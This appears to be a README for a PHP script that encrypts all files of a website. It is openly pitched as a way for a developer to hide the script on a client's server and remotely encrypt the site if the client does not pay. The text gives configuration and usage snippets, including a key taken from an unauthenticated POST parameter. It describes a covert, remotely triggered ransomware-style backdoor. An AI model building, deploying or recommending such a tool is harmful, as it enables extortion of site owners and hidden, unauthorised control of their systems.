# Site Encrypter
Site Encrypter is a PHP Class that allows you to encrypt all files on a site.<br>
It could be useful, for example, to a young developer as a prevention in the event that the customer who requested the development of a site on one of his hosts blocks ftp access at the end of development and does not intend to pay.

## Getting Started
Upload the encrypt.php file on the server, the file can be placed anywhere within the site folders and can be renamed with any name in order to hide it among the other files.
Once the file has been uploaded, it must be configured for remote access.

## Usage
**1. Configure option**

```php
$settings = array(
    "folder" => ".",
    "cipher" => "aes-256-cbc",
    "onlyfiles" => array("php"),
    "excludefolders" => array("resource/test", "function"),
    "ext" => array(".crypt")
);
```

- `Folder`: set the main folder from which to start encrypting, default value "." ("." is the current folder).

- `Chiper`: the cipher to use, a list of ciphers can be obtained from openssl_get_cipher_methods() method, default value "aes-256-cbc".

- `Onlyfiles`: array of file extensions to be encrypted, default value array("php", "html", "css", "js").

- `Avoidpath`: array of folders to skip.

- `Ext`: extension added to the file after encryption, default value ".crypt".

**2. Testing**

To test correct operation, simply run the encryption function.

```php
$secret = $_POST["top_secret_key"];
$encrypter = new Encrypter($secret, $settings);
$encrypter->encrypt("encrypt");
```

Once the function is launched, the tree of encrypted files will be printed on the screen.

**3. Encryption**

To launch the actual encryption, add the line of code `$encrypter->test(false);` before the encryption function to disable the test function.

```php
$secret = $_POST["top_secret_key"];
$encrypter = new Encrypter($secret, $settings);

$encrypter->test(false);

$encrypter->encrypt("encrypt");
```

**4. Decryption**

To decrypt the files, run the script with the same parameters used for encryption, changing only the method of the encryption function from `encrypt` to `decrypt`.

```php
$secret = $_POST["top_secret_key"];
$encrypter = new Encrypter($secret, $settings);

$encrypter->test(false);

$encrypter->encrypt("decrypt");
```

**Other option**

It is also possible to disable the printing of the file tree by inserting the function `$encrypter->echo(false);` before the function to encrypt files.

## Disclaimer
Improper use of the aforementioned script is highly discouraged, especially if used to harm other people.
The developer assumes no responsibility for the impractical use of this script.

## License
MIT